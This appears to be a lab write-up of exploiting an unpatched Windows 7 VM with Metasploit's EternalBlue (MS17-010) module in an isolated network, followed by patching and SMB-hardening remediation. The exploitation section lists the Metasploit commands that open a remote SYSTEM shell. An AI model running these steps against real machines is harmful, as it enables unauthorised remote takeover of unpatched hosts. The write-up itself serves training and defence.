# Windows Vulnerability Assessment and Remediation Lab

## Objective
Demonstrate the impact of unpatched Windows systems and validate the effectiveness of Microsoft security updates through a controlled lab environment.

## Tools & Environment
* **Hypervisor:** VMWARE (Isolated Internal Network)
* **Attacker OS:** Kali Linux (`192.168.216.129`)
* **Target OS:** Windows 7 SP1 Unpatched (`192.168.216.132`)
* **Key Utilities:** Nmap, Metasploit Framework, SMB Protocol

## Execution Steps

### 1. Network Discovery
Conducted a network scan using Nmap from the attacker machine (`192.168.216.129`) to identify the target IP (`192.168.216.132`) and verify that port 445 (SMB) was open.

![Escaneo con nmap](/Images/nmap.png)

### 2. Vulnerability Exploitation
Utilized the Metasploit Framework to select and configure the `ms17_010_eternalblue` exploit pointing to the target `192.168.216.132`.

#### Commands used:

```bash
msfconsole
search eternalblue
```
![opciones del exploit](/Images/eternalblue.png)

```bash
set RHOSTS 192.168.216.132
set LHOST 192.168.216.129
exploit
```

![exploit options](/Images/msfconsole-options.png)


### 3. System Access
Successfully executed the payload, gaining a remote SYSTEM shell on the target Windows machine (`192.168.216.132`) from Kali Linux (`192.168.216.129`).

![exploit](/Images/exploit.png)
![exploit](/Images/meterpreter.png)

![exploit](/Images/info.png)



## Technical Remediation (IT Support Perspective)

To prevent this vulnerability in a production environment, the following actions are required:

Deploy Microsoft Security Update MS17-010 using WSUS or Microsoft Update Catalog.

Disable SMBv1 using PowerShell or Group Policy.

Block inbound SMB traffic (TCP 445) at the firewall perimeter.

Enable Windows Defender Firewall.

Maintain regular Windows Update cycles.

Monitor SMB-related events through Windows Event Viewer or a SIEM platform.

Validate remediation by rescanning with Nmap.

## Conclusion

This lab demonstrates how outdated Windows systems can be compromised when critical security updates are missing. Beyond exploitation, it highlights the importance of proactive patch management, secure network configuration, and continuous vulnerability validation to reduce organizational risk.
